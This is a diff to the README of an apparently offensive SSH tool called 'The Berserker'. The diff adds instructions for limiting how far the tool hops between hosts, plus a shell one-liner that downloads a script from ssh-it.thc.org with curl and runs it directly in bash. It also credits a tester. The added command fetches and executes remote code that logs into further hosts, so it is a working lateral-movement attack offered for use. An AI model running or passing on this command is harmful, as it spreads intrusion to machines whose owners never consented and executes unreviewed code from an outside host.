@@ -27,6 +27,11 @@ Read [how it works](how-it-works/) and [design choices](how-it-works/) we made.
 * No data is stored on the origin host or any target host.
 * A typical run completes within a few seconds.
 
+The default is to stop after a depth of 8. Changing this to ```BS_DEPTH=1``` will make The Berserker to log into the next host but not any farther.
+```shell
+export BS="$(curl -fsSL ssh-it.thc.org/bs)" && bash -c "BS_DEPTH=1 $BS"
+```
+
 ### When HTTPS is not available
 ```shell
 # Without HTTPS 
@@ -37,7 +42,7 @@ bash -c "$BS"
 ### Alpha Testing
 THIS IS ALPHA RELEASE. PLEASE TEST AND REPORT BACK ANY BUGS OR SUGGESTIONS.
 Many Thanks to:
-* ???
+* #!adm for testing and comments
 
 ### Contact
 
